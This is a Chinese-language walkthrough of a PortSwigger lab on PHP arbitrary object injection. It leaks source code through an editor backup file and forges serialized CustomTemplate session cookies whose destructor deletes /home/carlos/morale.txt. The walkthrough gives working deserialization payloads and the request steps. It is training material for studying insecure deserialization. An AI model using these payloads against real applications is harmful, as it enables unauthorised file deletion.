# 实验：PHP 中的任意对象注入

https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php

本实验使用基于序列化的会话机制，因此存在任意对象注入漏洞。为了解决本实验，请创建并注入一个恶意序列化对象，以从 Carlos 的主目录中删除 `morale.txt` 文件。你需要获取源代码访问权限才能解决此实验。

你可以使用以下凭据登录自己的账户：`wiener:peter`

> **提示**
> 你有时可以通过在文件名后附加波浪号（`~`）来读取源代码，以检索编辑器生成的备份文件。

## 步骤

探测
- 使用登录功能
    ```http
    HTTP/2 302 Found
    Location: /my-account?id=wiener
    Set-Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJyNmJvcjcwb2ZyMGpxMmF0Z2lwNGQyZ2xwaDkxZHhwZCI7fQ%3d%3d; Secure; HttpOnly; SameSite=None
    ```
    - 解码 base64 cookie
        ```php
        O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"r6bor70ofr0jq2atgip4d2glph91dxpd";}
        ```
        - 得到 php 序列化串

- 查看任意页面的 HTML 代码
    ```html
    <!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
    ```
    - 页面注释揭示了代码文件端点，并推测存在旧版

尝试使用注释泄露路径访问代码文件
- 直接访问
    - 得到服务器的空响应体的 200 响应

- 尝试访问备份，在文件名最后添加波浪线
    ```http
    GET /libs/CustomTemplate.php~ HTTP/2
    ```
    - 服务器响应 php 源码
        ```php
        <?php

        class CustomTemplate {
            private $template_file_path;
            private $lock_file_path;

            ...

            function __destruct() {
                // Carlos thought this would be a good idea
                // 若文件存在，则删除文件
                if (file_exists($this->lock_file_path)) {
                    unlink($this->lock_file_path);
                }
            }
        }

        ?>
        ```
    - php 代码功能追踪
        - 魔术析构函数中，`unlink` 函数可用来删除文件，使用 `lock_file_path` 参数
        - 无视魔术构造函数，序列化直接设置对象字段而不调用魔术构造函数

- 构建伪造序列化对象代码
    ```php
    O:14:"CustomTemplate":2:{s:18:"template_file_path";s:1:"x";s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
    ```
    - 设置对象 `CustomTemplate` 的参数 `lock_file_path` 为目标文件路径
    - 反序列化时创建此对象，结束反序列化时调用魔术析构函数：若文件存在，则删除

- 已知 php 序列化端点为请求头部的 cookie 字段，在此处设置伪造序列化对象代码
    - 提交后通过挑战

- 额外载荷
    ```php
    O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
    ```
    - 仅设置对象 `CustomTemplate` 的 `lock_file_path` 字段也可通关
